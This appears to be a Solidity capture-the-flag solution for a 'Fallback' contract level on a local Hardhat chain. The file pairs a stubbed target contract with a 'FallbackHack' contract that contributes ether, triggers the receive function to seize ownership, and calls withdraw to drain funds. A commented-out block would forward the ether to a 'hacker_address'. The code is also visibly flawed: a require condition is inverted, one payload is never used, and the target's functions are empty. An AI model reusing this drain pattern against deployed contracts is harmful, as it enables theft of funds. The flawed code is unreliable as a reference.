// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() { }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
   }

  function contribute() public payable { }

  function getContribution() public view returns (uint) { }

  function withdraw() public onlyOwner { }

  receive() external payable { }
}

contract FallbackHack {

    // This is the hardcoded contract address of the Fallback Contract
    // This is repeatable when using Hardhat

    address payable glb_addr = payable(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    bool public sucess_flag = false;

    // Accessing the Fallback Contract with its address
    Fallback fb_ =  Fallback(glb_addr);

    function becomeOwner() payable public {

        require(msg.value < 0.001 ether, "Need more ether");
        bytes memory payload1 = abi.encodeWithSignature("contribute()");
        bytes memory payload2 = abi.encodeWithSignature("receive()");
        uint256 halfEth = msg.value / 2;
        console.log("Small amout of ether to send");
        console.log(halfEth);

        // Checking the contribution based on initial call
        getContribution();

        // Sending a a small amount of ether to the contribute function
        (bool success1, bytes memory returnData1) = address(fb_).call{value: halfEth}(payload1);
        
        success1 ? console.log("Contribute succeeded") : console.log("Contribute not succeeded");

        (bool success2, bytes memory returnData2) = address(fb_).call{value: halfEth}("");

        success2 ? console.log("Fallback succeeded") : console.log("Fallback not succeeded");

        // Getting Contribution after contribution and fallback and Before Withdraw
        fb_.getContribution();

        console.log("Withdraw");
        fb_.withdraw();
        
        // Getting Contribution after contribution, fallback, and Before Withdraw

        getContribution();

    }

    function getContribution() public {

        fb_.getContribution();

        console.log("FBC Balance");
        console.log(address(this).balance);
        console.log("FB Balance");
        console.log(address(fb_).balance);

    }

    receive() external payable{
        require(msg.value > 0);
        console.log("final hack");
        // address hacker_address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;
        // console.log(gasleft());
        // payable(hacker_address).call{gas: 793200, value: msg.value}("");
        // console.log("final hack 2");

    }
}